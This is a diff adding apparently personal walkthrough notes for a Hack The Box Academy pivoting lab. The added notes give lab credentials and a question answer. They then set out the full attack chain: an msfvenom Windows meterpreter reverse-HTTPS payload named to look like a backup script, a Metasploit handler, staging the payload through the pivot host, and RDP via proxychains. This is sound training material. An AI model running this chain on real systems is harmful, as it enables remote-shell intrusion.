@@ -43,3 +43,83 @@ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 > -R asks the Ubuntu server to listen on targetIPAddress:8080 and forward
 > all incoming connections on port 8080 to your msfconsole listener on 0.0.0.0:8000
 
+# Questions
+
+Username
+```python
+ubuntu
+```
+
+Password
+```
+HTB_@cademy_stdnt!
+```
+
+SSH
+```python
+ssh ubuntu@10.129.91.105
+```
+### 1) Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target?
+
+Answer:
+```python
+172.16.5.129
+```
+
+First I need to generate the msfvenom payload for Windows
+```go
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+```
+
+Now I must configure the multi/handler
+```go
+use exploit/multi/handler
+```
+
+```go
+set payload windows/x64/meterpreter/reverse_https
+```
+
+```go
+set lhost 0.0.0.0
+```
+
+```go
+set lport 8000
+```
+
+```go
+run
+```
+
+Copy payload to Ubuntu server
+```go
+scp backupscript.exe ubuntu@10.129.91.105:~/
+```
+
+In order for the Windows host to download the file, the Ubuntu server must host it since that's the only route the Windows machine has access to too
+```go
+python3 -m http.server 8123
+```
+
+Pivot to Windows host
+
+Username
+```go
+victor
+```
+
+Password
+```go
+pass@123
+```
+
+IP
+```go
+172.16.5.19
+```
+
+Proxychains
+```go
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
